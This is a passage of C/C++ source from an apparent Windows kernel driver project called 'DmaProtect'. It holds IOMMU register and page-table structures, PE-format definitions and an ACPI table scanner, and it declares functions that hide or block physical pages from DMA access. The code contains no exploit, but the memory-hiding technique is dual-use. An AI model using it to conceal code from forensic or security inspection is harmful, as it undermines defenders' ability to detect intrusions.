} IOMMU_VENDOR_SPECIFIC_VF_CONTROL_BASE_LOW, * PIOMMU_VENDOR_SPECIFIC_VF_CONTROL_BASE_LOW;

typedef DWORD32 IOMMU_VENDOR_SPECIFIC_VF_CONTROL_BASE_HIGH, * PIOMMU_VENDOR_SPECIFIC_VF_CONTROL_BASE_HIGH;

typedef struct {
    IOMMU_VENDOR_SPECIFIC_CAP_HEADER header;
    IOMMU_VENDOR_SPECIFIC_CAP_INFO info;
    IOMMU_VENDOR_SPECIFIC_VF_BASE_LOW virtFuncBaseLow;
    IOMMU_VENDOR_SPECIFIC_VF_BASE_HIGH virtFuncBaseHigh;
    IOMMU_VENDOR_SPECIFIC_VF_CONTROL_BASE_LOW virtFuncCtlLow;
    IOMMU_VENDOR_SPECIFIC_VF_CONTROL_BASE_HIGH virtFuncCtlHigh;
} IOMMU_VENDOR_SPECIFIC_BLOCK_REGISTER, * PIOMMU_VENDOR_SPECIFIC_BLOCK_REGISTER;

/*
* IOMMU MMIO structures
*/
typedef struct {
    DWORD64 Size : 9;
    DWORD64 Reserved1 : 3;
    DWORD64 DevTabBase : 40;
    DWORD64 Reserved2 : 12;
} IOMMU_MMIO_DT_BASE_REGISTER, * PIOMMU_MMIO_DT_BASE_REGISTER;

typedef struct {
    DWORD64 Reserved1 : 12;
    DWORD64 ComBase : 40;
    DWORD64 Reserved2 : 4;
    DWORD64 ComLen : 4;
    DWORD64 Reserved3 : 4;
} IOMMU_MMIO_CMD_BASE_REGISTER, * PIOMMU_MMIO_CMD_BASE_REGISTER;

typedef struct {
    DWORD64 Reserved1 : 12;
    DWORD64 EventBase : 40;
    DWORD64 Reserved2 : 4;
    DWORD64 EventLen : 4;
    DWORD64 Reserved3 : 4;
} IOMMU_MMIO_LOG_BASE_REGISTER, * PIOMMU_MMIO_LOG_BASE_REGISTER;

typedef struct {
    DWORD64 IommuEn : 1;
    DWORD64 HtTunEn : 1;
    DWORD64 EventLogEn : 1;
    DWORD64 EventIntEn : 1;
    DWORD64 ComWaitIntEn : 1;
    DWORD64 InvTimeOut : 3;
    DWORD64 PassPW : 1;
    DWORD64 ResPassPW : 1;
    DWORD64 Coherent : 1;
    DWORD64 Isoc : 1;
    DWORD64 CmdBufEn : 1;
    DWORD64 PPRLogEn : 1;
    DWORD64 PprIntEn : 1;
    DWORD64 PPREn : 1;
    DWORD64 GTEn : 1;
    DWORD64 GAEn : 1;
    DWORD64 CRW : 4;
    DWORD64 SmiFEn : 1;
    DWORD64 SlfWBdis : 1;
    DWORD64 SmiFLogEn : 1;
    DWORD64 GAMEn : 3;
    DWORD64 GALogEn : 1;
    DWORD64 GAIntEn : 1;
    DWORD64 DualPprLogEn : 2;
    DWORD64 DualEventLogEn : 2;
    DWORD64 DevTblSegEn : 3;
    DWORD64 PrivAbrtEn : 2;
    DWORD64 PprAutoRspEn : 1;
    DWORD64 MarcEn : 1;
    DWORD64 BlkStopMrkEn : 1;
    DWORD64 PprAutoRspAon : 1;
    DWORD64 Reserved1 : 2;
    DWORD64 EPHEn : 1;
    DWORD64 HADUpdate : 2;
    DWORD64 GDUpdateDis : 1;
    DWORD64 Reserved2 : 1;
    DWORD64 XTEn : 1;
    DWORD64 IntCapXTEn : 1;
    DWORD64 vCmdEn : 1;
    DWORD64 vIommuEn : 1;
    DWORD64 GAUpdateDis : 1;
    DWORD64 GAPPIEn : 1;
    DWORD64 Reserved3 : 2;
    DWORD64 GCR3TRPMode : 1;
    DWORD64 IRTCacheDis : 1;
    DWORD64 GstBufferTRPMode : 1;
    DWORD64 SNPAVICEn : 3;
} IOMMU_MMIO_CTRL_REGISTER, * PIOMMU_MMIO_CTRL_REGISTER;

typedef struct {
    DWORD64 ExEn : 1;
    DWORD64 Allow : 1;
    DWORD64 Reserved : 10;
    DWORD64 ExclRangeBaseAddr : 40;
    DWORD64 Reserved1 : 12;
} IOMMU_MMIO_EXCL_BASE_REGISTER, * PIOMMU_MMIO_EXCL_BASE_REGISTER;

typedef struct {
    DWORD64 Reserved : 12;
    DWORD64 ExclRangeLimit : 40;
    DWORD64 Reserved1 : 12;
} IOMMU_MMIO_EXCL_LIMIT_REGISTER, * PIOMMU_MMIO_EXCL_LIMIT_REGISTER;

typedef struct {
    DWORD64 PreFSup : 1;
    DWORD64 PPRSup : 1;
    DWORD64 XTSup : 1;
    DWORD64 NXSup : 1;
    DWORD64 GTSup : 1;
    DWORD64 GAPPISup : 1;
    DWORD64 IASup : 1;
    DWORD64 GASup : 1;
    DWORD64 HESup : 1;
    DWORD64 PCSup : 1;
    DWORD64 HATS : 2;
    DWORD64 GATS : 2;
    DWORD64 GLXSup : 2;
    DWORD64 SmiFSup : 2;
    DWORD64 SmiFRC : 3;
    DWORD64 GAMSup : 3;
    DWORD64 DualPprLogSup : 2;
    DWORD64 Reserved11 : 2;
    DWORD64 DualEventLogSup : 2;
    DWORD64 Reserved12 : 1;
    DWORD64 SATSSup : 1;
    DWORD64 PASmax : 5;
    DWORD64 USSup : 1;
    DWORD64 DevTblSegSup : 2;
    DWORD64 PprOvrflwEarlySup : 1;
    DWORD64 PPRAutoRspSup : 1;
    DWORD64 MarcSup : 2;
    DWORD64 BlkStopMrkSup : 1;
    DWORD64 PerfOptSup : 1;
    DWORD64 MsiCapMmioSup : 1;
    DWORD64 Reserved3 : 1;
    DWORD64 GIoSup : 1;
    DWORD64 HASup : 1;
    DWORD64 EPHSup : 1;
    DWORD64 AttrFWSup : 1;
    DWORD64 HDSup : 1;
    DWORD64 Reserved4 : 1;
    DWORD64 InvIotlbTypeSup : 1;
    DWORD64 vIommuSup : 1;
    DWORD64 Reserved5 : 5;
    DWORD64 GAUpdateDisSup : 1;
    DWORD64 ForcePhyDestSup : 1;
    DWORD64 SNPSup : 1;
} IOMMU_MMIO_EXT_FEAT_REGISTER, * PIOMMU_MMIO_EXT_FEAT_REGISTER;

typedef struct {
    IOMMU_MMIO_DT_BASE_REGISTER devTableBaseReg;
    IOMMU_MMIO_CMD_BASE_REGISTER cmdBaseReg;
    IOMMU_MMIO_LOG_BASE_REGISTER logBaseReg;
    IOMMU_MMIO_CTRL_REGISTER ctrlReg;
    IOMMU_MMIO_EXCL_BASE_REGISTER exclBaseReg;
    IOMMU_MMIO_EXCL_LIMIT_REGISTER exclLimitReg;
    IOMMU_MMIO_EXT_FEAT_REGISTER extFeatReg;
} IOMMU_MMIO, * PIOMMU_MMIO;

typedef struct {
    struct {
        DWORD64 V : 1;
        DWORD64 TV : 1;
        DWORD64 Reserved1 : 5;
        DWORD64 HAD : 2;
        DWORD64 PagingMode : 3;
        DWORD64 PageTableRootPtr : 40;
        DWORD64 PPR : 1;
        DWORD64 GPRP : 1;
        DWORD64 GIoV : 1;
        DWORD64 GV : 1;
        DWORD64 GLX : 2;
        DWORD64 GCR3 : 3;
        DWORD64 IR : 1;
        DWORD64 IW : 1;
        DWORD64 Reserved2 : 1;
    } _63_0;
    struct {
        DWORD64 DomainID : 16;
        DWORD64 GCR3_30_15 : 16;
        DWORD64 IOTLBe : 1;
        DWORD64 SE : 1;
        DWORD64 SA : 1;
        DWORD64 IoCtl : 2;
        DWORD64 Cache : 1;
        DWORD64 SD : 1;
        DWORD64 EX : 1;
        DWORD64 SysMgt : 2;
        DWORD64 SATS : 1;
        DWORD64 GCR3_51_31 : 21;
    } _127_64;
    struct {
        DWORD64 IV : 1;
        DWORD64 IntTabLen : 4;
        DWORD64 IG : 1;
        DWORD64 InterruptTableRoot : 46;
        DWORD64 Reserved3 : 2;
        DWORD64 GuestPagingMode : 2;
        DWORD64 InitPass : 1;
        DWORD64 EIntPass : 1;
        DWORD64 NMIPass : 1;
        DWORD64 HPTMode : 1;
        DWORD64 IntCtl : 2;
        DWORD64 Lint0Pass : 1;
        DWORD64 Lint1Pass : 1;
    } _191_128;
    struct {
        DWORD64 Reserved4 : 15;
        DWORD64 vImuEn : 1;
        DWORD64 GDeviceID : 16;
        DWORD64 GuestID : 16;
        DWORD64 Reserved5 : 5;
        DWORD64 Reserved6 : 1;
        DWORD64 AttrV : 1;
        DWORD64 Mode0FC : 1;
        DWORD64 SnoopAttribute : 8;
    } _255_192;
} IOMMU_DEVICE_TABLE_ENTRY, * PIOMMU_DEVICE_TABLE_ENTRY;

typedef struct {
    DWORD64 Reserved1 : 4;
    DWORD64 CmdHeadPtr : 15;
    DWORD64 Reserved2 : 45;
} IOMMU_CMD_BUFFER_HEAD_REGISTER, * PIOMMU_CMD_BUFFER_HEAD_REGISTER;

typedef struct {
    DWORD64 Reserved1 : 4;
    DWORD64 CmdTailPtr : 15;
    DWORD64 Reserved2 : 45;
} IOMMU_CMD_BUFFER_TAIL_REGISTER, * PIOMMU_CMD_BUFFER_TAIL_REGISTER;

typedef struct {
    DWORD64 opcodeDependantOperand1_31_0 : 32;
    DWORD64 opcodeDependantOperand1_59_32 : 28;
    DWORD64 cmdCode : 4;
    DWORD64 opcodeDependantOperand2;
} IOMMU_GENERIC_CMD, * PIOMMU_GENERIC_CMD;

typedef struct {
    DWORD64 Reserved1 : 4;
    DWORD64 LogHeadPtr : 15;
    DWORD64 Reserved2 : 45;
} IOMMU_LOG_BUFFER_HEAD_REGISTER, * PIOMMU_LOG_BUFFER_HEAD_REGISTER;

typedef struct {
    DWORD64 Reserved1 : 4;
    DWORD64 LogTailPtr : 15;
    DWORD64 Reserved2 : 45;
} IOMMU_LOG_BUFFER_TAIL_REGISTER, * PIOMMU_LOG_BUFFER_TAIL_REGISTER;

typedef struct {
    DWORD64 opcodeDependantOperand1_31_0 : 32;
    DWORD64 opcodeDependantOperand1_59_32 : 28;
    DWORD64 evtCode : 4;
    DWORD64 opcodeDependantOperand2;
} IOMMU_GENERIC_LOG, * PIOMMU_GENERIC_LOG;

typedef struct {
    DWORD64 EventOverflow : 1;
    DWORD64 EventLogInt : 1;
    DWORD64 ComWaitInt : 1;
    DWORD64 EventLogRun : 1;
    DWORD64 CmdBufRun : 1;
    DWORD64 PprOverflow : 1;
    DWORD64 PprInt : 1;
    DWORD64 PPRLogRun : 1;
    DWORD64 GALogRun : 1;
    DWORD64 GALOverflow : 1;
    DWORD64 GAInt : 1;
    DWORD64 PprOvrflwB : 1;
    DWORD64 PprLogActive : 1;
    DWORD64 Reserved1 : 2;
    DWORD64 EventOvrflwB : 1;
    DWORD64 EventLogActive : 1;
    DWORD64 PprOvrflwEarlyB : 1;
    DWORD64 PprOvrflwEarly : 1;
    DWORD64 Reserved2 : 45;
} IOMMU_CMD_STATUS_REGISTER, * PIOMMU_CMD_STATUS_REGISTER;

typedef struct {
    DWORD64 PASID : 20;
    DWORD64 Reserved1 : 12;
    DWORD64 DomainID : 16;
    DWORD64 Reserved2 : 12;
    DWORD64 cmdCode : 4;
    DWORD64 S : 1;
    DWORD64 PDE : 1;
    DWORD64 GE : 1;
    DWORD64 Reserved3 : 9;
    DWORD64 Address : 52;
} IOMMU_INVALIDATE_IOMMU_PAGES, * PIOMMU_INVALIDATE_IOMMU_PAGES;

typedef struct {
    DWORD64 DeviceID : 16;
    DWORD64 Reserved1 : 44;
    DWORD64 cmdCode : 4;
    DWORD64 Reserved2;
} IOMMU_INVALIDATE_DEVTAB_ENTRY, * PIOMMU_INVALIDATE_DEVTAB_ENTRY;

#define INVALIDATE_DEVTAB_ENTRY 0x2
#define INVALIDATE_IOMMU_PAGES 0x3
#define INVALIDATE_IOMMU_ALL 0x8

#define CMD_BUFFER_HEAD_REGISTER_OFFSET 0x2000
#define CMD_BUFFER_TAIL_REGISTER_OFFSET 0x2008
#define CMD_LOG_HEAD_REGISTER_OFFSET 0x2010
#define CMD_LOG_TAIL_REGISTER_OFFSET 0x2018
#define CMD_STATUS_REGISTER_OFFSET 0x2020

#define IOMMU_PAGE_TABLES_LEVELS 4
#define IOMMU_PAGE_TABLES_ENTRIES 512

typedef union {
    struct {
        DWORD64 PR : 1;
        DWORD64 Reserved1 : 4;
        DWORD64 A : 1;
        DWORD64 D : 1;
        DWORD64 Reserved2 : 2;
        DWORD64 NextLevel : 3;
        DWORD64 PageAddress : 40;
        DWORD64 Reserved3 : 7;
        DWORD64 U : 1;
        DWORD64 FC : 1;
        DWORD64 IR : 1;
        DWORD64 IW : 1;
        DWORD64 Reserved4 : 1;
    } bits;
    DWORD64 Flags;
} IOMMU_PTE, * PIOMMU_PTE;

typedef struct {
    DECLSPEC_ALIGN(PAGE_SIZE) IOMMU_PTE level4[IOMMU_PAGE_TABLES_ENTRIES];
    DECLSPEC_ALIGN(PAGE_SIZE) IOMMU_PTE level3[IOMMU_PAGE_TABLES_ENTRIES];
    DECLSPEC_ALIGN(PAGE_SIZE) IOMMU_PTE level2[IOMMU_PAGE_TABLES_ENTRIES][IOMMU_PAGE_TABLES_ENTRIES];
} IOMMU_PAGE_TABLES, * PIOMMU_PAGE_TABLES;

#pragma pack()
namespace iommu {
    bool Init();

    PIOMMU_PAGE_TABLES CreateIommuPageTables();
    bool HidePage(PVOID pTarget, PVOID pSubstitute = nullptr);
    bool HidePageRange(PVOID pBase, SIZE_T szRegion, PVOID pSubstitute = nullptr);
    bool BlockPage(PVOID pTarget);
    bool BlockPageRange(PVOID pBase, SIZE_T szRegion);

    void EnableIommu();
}

```

`DmaProtect/include/macros.h`:

```h
#pragma once

#define DbgMsg(x, ...) DbgPrintEx(0, 0, x##"\n", __VA_ARGS__)


```

`DmaProtect/include/pe.h`:

```h
#pragma once
#include "cpp.h"

#define IMAGE_NUMBEROF_DIRECTORY_ENTRIES    16
#define IMAGE_DOS_SIGNATURE                 0x5A4D      // MZ
#define IMAGE_NT_SIGNATURE                  0x00004550  // PE00
#define IMAGE_SIZEOF_SHORT_NAME             8
#define IMAGE_SCN_CNT_UNINITIALIZED_DATA    0x00000080  // Section contains uninitialized data.
#define IMAGE_SCN_MEM_WRITE                 0x80000000
#define UNW_FLAG_EHANDLER  1
#define IMAGE_DIRECTORY_ENTRY_EXPORT	0
#define IMAGE_DIRECTORY_ENTRY_IMPORT	1
#define IMAGE_DIRECTORY_ENTRY_EXCEPTION      3
#define IMAGE_DIRECTORY_ENTRY_BASERELOC       5
#define IMAGE_REL_BASED_DIR64                   10

#define IMAGE_FIRST_SECTION( ntheader ) ((PIMAGE_SECTION_HEADER)        \
    ((ULONG_PTR)(ntheader) +                                            \
     FIELD_OFFSET( IMAGE_NT_HEADERS, OptionalHeader ) +                 \
     ((ntheader))->FileHeader.SizeOfOptionalHeader   \
    ))

#define RELOC_FLAG64(RelInfo) ((RelInfo >> 0x0C) == IMAGE_REL_BASED_DIR64)
#define RELOC_FLAG RELOC_FLAG64

#define IMAGE_ORDINAL_FLAG64 0x8000000000000000ULL

#define IMAGE_ORDINAL_FLAG32 0x80000000

#define IMAGE_ORDINAL64(Ordinal) (Ordinal & 0xffff)

#define IMAGE_ORDINAL32(Ordinal) (Ordinal & 0xffff)

#define IMAGE_SNAP_BY_ORDINAL64(Ordinal) ((Ordinal & IMAGE_ORDINAL_FLAG64) != 0)

#define IMAGE_SNAP_BY_ORDINAL32(Ordinal) ((Ordinal & IMAGE_ORDINAL_FLAG32) != 0)

#define IMAGE_SNAP_BY_ORDINAL IMAGE_SNAP_BY_ORDINAL64

#define IS_MZ(Base) (*(USHORT*)Base == 'MZ')

#define IMAGE_SCN_MEM_EXECUTE 0x20000000

typedef struct _IMAGE_BASE_RELOCATION {
    ULONG VirtualAddress;
    ULONG SizeOfBlock;
} IMAGE_BASE_RELOCATION, * PIMAGE_BASE_RELOCATION;

typedef struct _IMAGE_IMPORT_DESCRIPTOR {
    union {
        ULONG   Characteristics;
        ULONG   OriginalFirstThunk;
    } DUMMYUNIONNAME;
    ULONG   TimeDateStamp;
    ULONG   ForwarderChain;
    ULONG   Name;
    ULONG   FirstThunk;
} IMAGE_IMPORT_DESCRIPTOR, * PIMAGE_IMPORT_DESCRIPTOR;

typedef struct _IMAGE_IMPORT_BY_NAME {
    USHORT  Hint;
    UCHAR   Name[1];
} IMAGE_IMPORT_BY_NAME, * PIMAGE_IMPORT_BY_NAME;

typedef struct _IMAGE_EXPORT_DIRECTORY {
    ULONG Characteristics;
    ULONG TimeDateStamp;
    USHORT MajorVersion;
    USHORT MinorVersion;
    ULONG Name;
    ULONG Base;
    ULONG NumberOfFunctions;
    ULONG NumberOfNames;
    ULONG AddressOfFunctions;
    ULONG AddressOfNames;
    ULONG AddressOfNameOrdinals;
} IMAGE_EXPORT_DIRECTORY, * PIMAGE_EXPORT_DIRECTORY;

typedef struct _SCOPE_RECORD {
    UINT32 BeginAddress;
    UINT32 EndAddress;
    UINT32 HandlerAddress;
    UINT32 JumpTarget;
} SCOPE_RECORD;

typedef struct _SCOPE_TABLE {
    UINT32 Count;
    SCOPE_RECORD ScopeRecords[1];
} SCOPE_TABLE;

typedef struct _RUNTIME_FUNCTION {
    UINT32 BeginAddress;
    UINT32 EndAddress;
    UINT32 UnwindData;
} RUNTIME_FUNCTION;

typedef union _UNWIND_CODE {
    UINT8 CodeOffset;
    UINT8 UnwindOp : 4;
    UINT8 OpInfo : 4;
    UINT16 FrameOffset;
} UNWIND_CODE;

typedef struct _UNWIND_INFO {
    UINT8 Version : 3;
    UINT8 Flags : 5;
    UINT8 SizeOfProlog;
    UINT8 CountOfCodes;
    UINT8 FrameRegister : 4;
    UINT8 FrameOffset : 4;
    UNWIND_CODE UnwindCode[1];

    union {
        UINT32 ExceptionHandler;
        UINT32 FunctionEntry;
    };

    UINT32 ExceptionData[1];
} UNWIND_INFO;

typedef struct _IMAGE_DOS_HEADER {      // DOS .EXE header
    UINT16   e_magic;                     // Magic number
    UINT16   e_cblp;                      // UINT8s on last page of file
    UINT16   e_cp;                        // Pages in file
    UINT16   e_crlc;                      // Relocations
    UINT16   e_cparhdr;                   // Size of header in paragraphs
    UINT16   e_minalloc;                  // Minimum extra paragraphs needed
    UINT16   e_maxalloc;                  // Maximum extra paragraphs needed
    UINT16   e_ss;                        // Initial (relative) SS value
    UINT16   e_sp;                        // Initial SP value
    UINT16   e_csum;                      // Checksum
    UINT16   e_ip;                        // Initial IP value
    UINT16   e_cs;                        // Initial (relative) CS value
    UINT16   e_lfarlc;                    // File address of relocation table
    UINT16   e_ovno;                      // Overlay number
    UINT16   e_res[4];                    // Reserved words
    UINT16   e_oemid;                     // OEM identifier (for e_oeminfo)
    UINT16   e_oeminfo;                   // OEM information; e_oemid specific
    UINT16   e_res2[10];                  // Reserved words
    UINT32   e_lfanew;                    // File address of new exe header
} IMAGE_DOS_HEADER, * PIMAGE_DOS_HEADER;

typedef struct _IMAGE_FILE_HEADER {
    UINT16    Machine;
    UINT16    NumberOfSections;
    UINT32   TimeDateStamp;
    UINT32   PointerToSymbolTable;
    UINT32   NumberOfSymbols;
    UINT16    SizeOfOptionalHeader;
    UINT16    Characteristics;
} IMAGE_FILE_HEADER, * PIMAGE_FILE_HEADER;

typedef struct _IMAGE_DATA_DIRECTORY {
    UINT32   VirtualAddress;
    UINT32   Size;
} IMAGE_DATA_DIRECTORY, * PIMAGE_DATA_DIRECTORY;

typedef struct _IMAGE_OPTIONAL_HEADER64 {
    UINT16        Magic;
    UINT8        MajorLinkerVersion;
    UINT8        MinorLinkerVersion;
    UINT32       SizeOfCode;
    UINT32       SizeOfInitializedData;
    UINT32       SizeOfUninitializedData;
    UINT32       AddressOfEntryPoint;
    UINT32       BaseOfCode;
    ULONGLONG   ImageBase;
    UINT32       SectionAlignment;
    UINT32       FileAlignment;
    UINT16        MajorOperatingSystemVersion;
    UINT16        MinorOperatingSystemVersion;
    UINT16        MajorImageVersion;
    UINT16        MinorImageVersion;
    UINT16        MajorSubsystemVersion;
    UINT16        MinorSubsystemVersion;
    UINT32       Win32VersionValue;
    UINT32       SizeOfImage;
    UINT32       SizeOfHeaders;
    UINT32       CheckSum;
    UINT16        Subsystem;
    UINT16        DllCharacteristics;
    ULONGLONG   SizeOfStackReserve;
    ULONGLONG   SizeOfStackCommit;
    ULONGLONG   SizeOfHeapReserve;
    ULONGLONG   SizeOfHeapCommit;
    UINT16       LoaderFlags;
    UINT32       NumberOfRvaAndSizes;
    IMAGE_DATA_DIRECTORY DataDirectory[IMAGE_NUMBEROF_DIRECTORY_ENTRIES];
} IMAGE_OPTIONAL_HEADER64, * PIMAGE_OPTIONAL_HEADER64;

typedef struct _IMAGE_NT_HEADERS64 {
    UINT32 Signature;
    IMAGE_FILE_HEADER FileHeader;
    IMAGE_OPTIONAL_HEADER64 OptionalHeader;
} IMAGE_NT_HEADERS64, * PIMAGE_NT_HEADERS64;

typedef struct _IMAGE_SECTION_HEADER {
    UINT8    Name[IMAGE_SIZEOF_SHORT_NAME];
    union {
        UINT32   PhysicalAddress;
        UINT32   VirtualSize;
    } Misc;
    UINT32   VirtualAddress;
    UINT32   SizeOfRawData;
    UINT32   PointerToRawData;
    UINT32   PointerToRelocations;
    UINT32   PointerToLinenumbers;
    UINT16    NumberOfRelocations;
    UINT16    NumberOfLinenumbers;
    UINT32   Characteristics;
} IMAGE_SECTION_HEADER, * PIMAGE_SECTION_HEADER;

typedef IMAGE_NT_HEADERS64                  IMAGE_NT_HEADERS;

```

`DmaProtect/include/signatures.h`:

```h
#pragma once

/**

 * Returns a 16-bit signature built from 2 ASCII characters.

 *

 * This macro returns a 16-bit value built from the two ASCII characters

 * specified by A and B.

 *

 * @A: The first ASCII character.

 * @B: The second ASCII character.

 *

 * @return: A 16-bit value built from the two ASCII characters specified by

 *          A and B.

 */

#define SIGNATURE_16(A, B)	((A) | (B << 8))

 /**

  * Returns a 32-bit signature built from 4 ASCII characters.

  *

  * This macro returns a 32-bit value built from the four ASCII characters

  * specified by A, B, C, and D.

  *

  * @A: The first ASCII character.

  * @B: The second ASCII character.

  * @C: The third ASCII character.

  * @D: The fourth ASCII character.

  *

  * @return: A 32-bit value built from the two ASCII characters specified by

  *          A, B, C and D.

  */

#define SIGNATURE_32(A, B, C, D)	\
	(SIGNATURE_16(A, B) | (SIGNATURE_16(C, D) << 16))

  /**

   * Returns a 64-bit signature built from 8 ASCII characters.

   *

   * This macro returns a 64-bit value built from the eight ASCII characters

   * specified by A, B, C, D, E, F, G,and H.

   *

   * @A: The first ASCII character.

   * @B: The second ASCII character.

   * @C: The third ASCII character.

   * @D: The fourth ASCII character.

   * @E: The fifth ASCII character.

   * @F: The sixth ASCII character.

   * @G: The seventh ASCII character.

   * @H: The eighth ASCII character.

   *

   * @return: A 64-bit value built from the two ASCII characters specified by

   *          A, B, C, D, E, F, G and H.

   */

#define SIGNATURE_64(A, B, C, D, E, F, G, H)	\
	(SIGNATURE_32(A, B, C, D) | ((u64)(SIGNATURE_32(E, F, G, H)) << 32))

```

`DmaProtect/include/status.h`:

```h
#pragma once

#define STATUS_DMA_REMAPPING_NOT_AVAILABLE	0x80008000
#define STATUS_DMA_REMAPPING_FAILED			0x80008001

```

`DmaProtect/include/threading.h`:

```h
#pragma once
#include "cpp.h"

#define SLEEP_FOREVER -1

namespace threading {
	void Sleep(int ms);
}
```

`DmaProtect/include/win.h`:

```h
#pragma once
#include "cpp.h"

namespace win {
	void* FindCurrentBase();
}
```

`DmaProtect/src/Memory.cpp`:

```cpp
#include "Memory.h"

UINT64 Memory::VirtToPhy(PVOID Va)
{
	return MmGetPhysicalAddress(Va).QuadPart;
}

UINT64 Memory::PhyToVirt(UINT64 Pa)
{
	PHYSICAL_ADDRESS PhysicalAddr;
	PhysicalAddr.QuadPart = Pa;

	return (UINT64)MmGetVirtualForPhysical(PhysicalAddr);
}
```

`DmaProtect/src/acpi.cpp`:

```cpp
#include "acpi.h"

#include "threading.h"

EFI_GUID gEfiAcpiTableGuid = { 0x8868E871, 0xE4F1, 0x11D3, { 0xBC, 0x22, 0x00, 0x80, 0xC7, 0x3C, 0x88, 0x81 } };
EFI_GUID gEfiAcpi10TableGuid = { 0xEB9D2D30, 0x2D88, 0x11D3, { 0x9A, 0x16, 0x00, 0x90, 0x27, 0x3F, 0xC1, 0x4D } };
EFI_GUID gEfiAcpi20TableGuid = { 0x8868E871, 0xE4F1, 0x11D3, { 0xBC, 0x22, 0x00, 0x80, 0xC7, 0x3C, 0x88, 0x81 } };

/**
  This function scans ACPI table in XSDT/RSDT.

  @param Sdt                    ACPI XSDT/RSDT.
  @param TablePointerSize       Size of table pointer: 8(XSDT) or 4(RSDT).
  @param Signature              ACPI table signature.
  @param PreviousTable          Pointer to previous returned table to locate
                                next table, or NULL to locate first table.
  @param PreviousTableLocated   Pointer to the indicator about whether the
                                previous returned table could be located, or
                                NULL if PreviousTable is NULL.

  If PreviousTable is NULL and PreviousTableLocated is not NULL, then ASSERT().
  If PreviousTable is not NULL and PreviousTableLocated is NULL, then ASSERT().

  @return ACPI table or NULL if not found.

**/
EFI_ACPI_COMMON_HEADER*
ScanTableInSDT(
    IN  EFI_ACPI_DESCRIPTION_HEADER* Sdt,
    IN  UINTN                        TablePointerSize,
    IN  UINT32                       Signature,
    IN  EFI_ACPI_COMMON_HEADER* PreviousTable  OPTIONAL,
    OUT BOOLEAN* PreviousTableLocated OPTIONAL
)
{
    UINTN                   Index;
    UINTN                   EntryCount;
    UINT64                  EntryPtr;
    UINTN                   BasePtr;
    EFI_ACPI_COMMON_HEADER* Table;

    if (PreviousTableLocated != NULL) {
        ASSERT(PreviousTable != NULL);
        *PreviousTableLocated = FALSE;
    }
    else {
        ASSERT(PreviousTable == NULL);
    }

    if (Sdt == NULL) {
        DbgMsg("[ACPI] SDT is null!");
        return NULL;
    }

    DbgMsg("[ACPI] SDT %c%c%c%c with length: 0x%x", Int2Chars(Signature), Sdt->Length);
    EntryCount = (Sdt->Length - sizeof(EFI_ACPI_DESCRIPTION_HEADER)) / TablePointerSize;
    DbgMsg("[ACPI] SDT found with %d entries", EntryCount);

    BasePtr = (UINTN)(Sdt + 1);
    DbgMsg("[ACPI] Base ptr at: %p", BasePtr);
    for (Index = 0; Index < EntryCount; Index++) {
        EntryPtr = 0;
        memcpy(&EntryPtr, (VOID*)(BasePtr + Index * TablePointerSize), TablePointerSize);
        DbgMsg("[ACPI] Table %d at: %p", Index, EntryPtr);
        if (!MmIsAddressValid((PVOID)EntryPtr)) {
            PHYSICAL_ADDRESS pa = { 0 };
            pa.QuadPart = EntryPtr;
            EntryPtr = (UINTN)MmMapIoSpace(pa, sizeof(EFI_ACPI_COMMON_HEADER), MEMORY_CACHING_TYPE::MmNonCached);
            if (!EntryPtr) {
                DbgMsg("[ACPI] Could not map address!");
                continue;
            }
        }
        Table = (EFI_ACPI_COMMON_HEADER*)(EntryPtr);
        if ((Table != NULL) && (Table->Signature == Signature)) {
            if (PreviousTable != NULL) {
                if (Table == PreviousTable) {
                    *PreviousTableLocated = TRUE;
                }
                else if (*PreviousTableLocated) {
                    //
                    // Return next table.
                    //
                    return Table;
                }
            }
            else {
                //
                // Return first table.
                //
                return Table;
            }
        }
    }

    DbgMsg("[ACPI] No table found in SDT");
    return NULL;
}

/**
  To locate FACS in FADT.

  @param Fadt   FADT table pointer.

  @return FACS table pointer or NULL if not found.

**/
EFI_ACPI_COMMON_HEADER*
LocateAcpiFacsFromFadt(
    IN EFI_ACPI_2_0_FIXED_ACPI_DESCRIPTION_TABLE* Fadt
)
{
    EFI_ACPI_COMMON_HEADER* Facs;
    UINT64                  Data64;

    if (Fadt == NULL) {
        DbgMsg("[ACPI] FADT is null!");
        return NULL;
    }

    if (Fadt->Header.Revision < EFI_ACPI_2_0_FIXED_ACPI_DESCRIPTION_TABLE_REVISION) {
        Facs = (EFI_ACPI_COMMON_HEADER*)Fadt->FirmwareCtrl;
    }
    else {
        memcpy(&Data64, &Fadt->XFirmwareCtrl, sizeof(UINT64));
        if (Data64 != 0) {
            Facs = (EFI_ACPI_COMMON_HEADER*)Data64;
        }
        else {
            Facs = (EFI_ACPI_COMMON_HEADER*)Fadt->FirmwareCtrl;
        }
    }

    return Facs;
}

/**
  To locate DSDT in FADT.

  @param Fadt   FADT table pointer.

  @return DSDT table pointer or NULL if not found.

**/
EFI_ACPI_COMMON_HEADER*
LocateAcpiDsdtFromFadt(
    IN EFI_ACPI_2_0_FIXED_ACPI_DESCRIPTION_TABLE* Fadt
)
{
    EFI_ACPI_COMMON_HEADER* Dsdt;
    UINT64                  Data64;

    if (Fadt == NULL) {
        DbgMsg("[ACPI] FADT is null!");
        return NULL;
    }

    if (Fadt->Header.Revision < EFI_ACPI_2_0_FIXED_ACPI_DESCRIPTION_TABLE_REVISION) {
        Dsdt = (EFI_ACPI_COMMON_HEADER*)Fadt->Dsdt;
    }
    else {
        memcpy(&Data64, &Fadt->XDsdt, sizeof(UINT64));
        if (Data64 != 0) {
            Dsdt = (EFI_ACPI_COMMON_HEADER*)Data64;
        }
        else {
            Dsdt = (EFI_ACPI_COMMON_HEADER*)Fadt->Dsdt;
        }
    }

    return Dsdt;
}

/**
  To locate ACPI table in ACPI ConfigurationTable.

  @param AcpiGuid               The GUID used to get ACPI ConfigurationTable.
  @param Signature              ACPI table signature.
  @param PreviousTable          Pointer to previous returned table to locate
                                next table, or NULL to locate first table.
  @param PreviousTableLocated   Pointer to the indicator to return whether the
                                previous returned table could be located or not,
                                or NULL if PreviousTable is NULL.

  If PreviousTable is NULL and PreviousTableLocated is not NULL, then ASSERT().
  If PreviousTable is not NULL and PreviousTableLocated is NULL, then ASSERT().
  If AcpiGuid is NULL, then ASSERT().

  @return ACPI table or NULL if not found.

**/
EFI_ACPI_COMMON_HEADER*
LocateAcpiTableInAcpiConfigurationTable(
    IN  EFI_GUID* AcpiGuid,
    IN  UINT32                  Signature,
    IN  EFI_ACPI_COMMON_HEADER* PreviousTable  OPTIONAL,
    OUT BOOLEAN* PreviousTableLocated OPTIONAL
)
{
    UNREFERENCED_PARAMETER(AcpiGuid);

